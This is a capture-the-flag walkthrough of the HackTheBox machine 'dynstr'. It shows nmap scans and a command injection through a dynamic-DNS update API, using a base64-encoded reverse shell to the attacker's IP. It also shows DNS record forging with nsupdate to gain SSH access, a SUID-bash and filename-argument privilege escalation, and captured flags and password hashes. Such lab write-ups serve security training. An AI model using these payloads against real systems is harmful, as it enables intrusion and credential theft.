# dynster Hackthebox Walkthrough

## All Ports Scan
```bash
# Nmap 7.91 scan initiated Sun Jun 13 00:31:03 2021 as: nmap -T4 -sT -vv -p- -oA nmap/allports 10.129.94.218
Nmap scan report for 10.129.94.218
Host is up, received reset ttl 63 (0.14s latency).
Scanned at 2021-06-13 00:31:03 EDT for 857s
Not shown: 65532 closed ports
Reason: 65532 conn-refused
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
53/tcp open  domain  syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jun 13 00:45:21 2021 -- 1 IP address (1 host up) scanned in 857.90 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Sun Jun 13 00:31:29 2021 as: nmap -T4 -sT -sV -sC -vv -A -p22,53,80 -oA nmap/complete 10.129.94.218
adjust_timeouts2: packet supposedly had rtt of -88285 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -88285 microseconds.  Ignoring time.
Nmap scan report for 10.129.94.218
Host is up, received reset ttl 63 (0.14s latency).
Scanned at 2021-06-13 00:31:30 EDT for 21s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC//sbOTQwLRH4CGj3riDnnTvTCiJT1Uz7CyRSD2Tkh2wkT20rtAq13c5M1LC2kxki2bz9Ptxxx340Cc9tAcQaPZbmHndQe/H1bGiVZCKjOl2WqWQTV9fq6GGtflC94BkkLrmkWHzqg+S50g2Zg0iesPMkKAmwqwEVZx9npe1QuF3RQu5EYQXRYVOzpqQdU+jRD267gCvsKp9xmr7trZ1UzFxfBUOzSCWa3Adm2TTFwiA5jTb6x0lKVnQtgKghioMQeXXPuiTLCbI0XfbksoRI2OBAvTZf7RsIthKCiyCQRWjVh5Idr5Fh7GgwYaDgW662W3V3hCNEQRY8R9/fXWdVho1gWbm6NFt+NyRO/6F2XDvPseBYr+Yi6zwGEM+PpsTi5dfj8yYKRZ3HFXwjeBGjCPMRe9XPpCvvDnHAF18B1INVJPSwAIVll365V5D18JslQh7PpAWxO70TzmEC9E+UPXOrt29tZ0Zi/uApFRM700pdOhnvcs8q4RBWaUpp3ZB0=
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFtYzp8umMbm7o9+1LUTVio/dduowE/AsA3rO52A5Q/Cuct9GY6IZEvPE+/XpEiNCPMSl991kjHT+WaAunmTbT4=
|   256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz8b9MDlSPP5QJgSHy6fpG98bdKCgvqhuu07v5NFkdx
53/tcp open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=6/13%OT=22%CT=%CU=31161%PV=Y%DS=2%DC=T%G=N%TM=60C58A38%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 36.643 days (since Fri May  7 09:06:24 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   137.57 ms 10.10.14.1
2   138.15 ms 10.129.94.218

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 13 00:31:52 2021 -- 1 IP address (1 host up) scanned in 23.13 seconds
```

## Port 80 Enumeration
Got multiple doamins. 
```bash
Domains : 
dnsalias.htb 
dynamicdns.htb 
no-ip.htb 
dns1.dyna.htb 
dyna.htb 
www.dyna.htb
```

![](Images/Pasted%20image%2020210614162954.png)

Here is a hint it uses API as same as no-ip.com.

```bash
-   Username: dynadns
-   Password: sndanyd
```

```bash
/assets               (Status: 301) [Size: 313] [--> http://dnsalias.htb/assets/]
/nic                  (Status: 301) [Size: 310] [--> http://dnsalias.htb/nic/]
/server-status        (Status: 403) [Size: 277]
```

So i looked for the no-ip api method.

https://www.noip.com/integrate/request

![](Images/Pasted%20image%2020210614173612.png)

```java
# curl -X GET 'http://no-ip.htb/nic/update?hostname=dynstr.no-ip.htb&myip=127.0.0.1' --header 'Authorization: Basic ZHluYWRuczpzbmRhbnlk'
# curl -X GET 'http://no-ip.htb/nic/update?hostname=dynstr.no-ip.htb&myip=echo+"cGluZyAxMC4xMC4xNC42MQo="|+base64+-d|+bash""127.0.0.1&offline=YES' --header 'Authorization: Basic ZHluYWRuczpzbmRhbnlk'
```


```java
curl -X GET 'http://no-ip.htb/nic/update?myip=10.129.158.58&hostname=`echo%20%22YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzQ0MyAwPiYx%0A%22%20%7C%20base64%20-d%20%7C%20bash%60%20%22abc.no-ip.htb&offline=YES' -H 'Authorization: Basic ZHluYWRuczpzbmRhbnlk'
```

![](Images/Pasted%20image%2020210614182158.png)

```java
www-data@dynstr:/var/www/html/nic$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
dyna:x:1000:1000:dyna,,,:/home/dyna:/bin/bash
bindmgr:x:1001:1001::/home/bindmgr:/bin/bash
```


![](Images/Pasted%20image%2020210614191732.png)

![](Images/Pasted%20image%2020210614191801.png)

![](Images/Pasted%20image%2020210614202857.png)


```java
www-data@dynstr:/var/www/html/nic$ nsupdate -k /etc/bind/infra.key
> update add random.infra.dyna.htb. 86400 A 10.10.14.61
> update add 61.14.10.10.in-addr.arpa 300 PTR random.infra.dyna.htb
> send

# ssh bindmgr@10.129.158.196 -i ssh.key
```

![](Images/Pasted%20image%2020210614211434.png)


```bash
Flag : 
User Flag : c4e24b22f5da8c7efe2519c6966b97f5
Root Flag : 3a0035b0bc0a4cf71a38037c2a643971

Hash :
root:$6$knCJjR0E8SuLyI5.$r7dGtVVY/Z6X0RQKxUvBZY4BQ3DwL7kHtu5YO9cclorPryKq489j2JqN262Ows/aRZvFkQ1R9uQyqoVWeS8ED1:18705:0:99999:7:::
dyna:$6$hiaXtKAlnSGLdd7X$XdibCf6o9t48IurOmJ0Ip6CsRFWy8pDWTCsFI/DrE2hNbWRSouBZxlAEeoQlfSzLnN39OieXQajwNGDd79Sp./:18705:0:99999:7:::
bindmgr:$6$Y8Q9OmFn9eZFhOVP$QdBBPBiiEGRSIzIE6nAhYIfNeo76Dro0.noSn0Tmvh3j./c3xlcprwtmmeConQ4NtltncDZP3lreBQTwXjFP8/:18772:0:99999:7:::
```

## Priv Esec

```bash
Previlege Escalation

bindmgr@dynstr:~$ echo 2 > .version
bindmgr@dynstr:~$ cp /bin/bash .
bindmgr@dynstr:~$ chmod +s bash
bindmgr@dynstr:~$ echo > --preserve=mode
bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh
bindmgr@dynstr:~$ ls -la /etc/bind/named.bindmgr/
bindmgr@dynstr:~$ /etc/bind/named.bindmgr/bash -p
```

![](Images/Pasted%20image%2020210614211600.png)

![](Images/Pasted%20image%2020210614224848.png)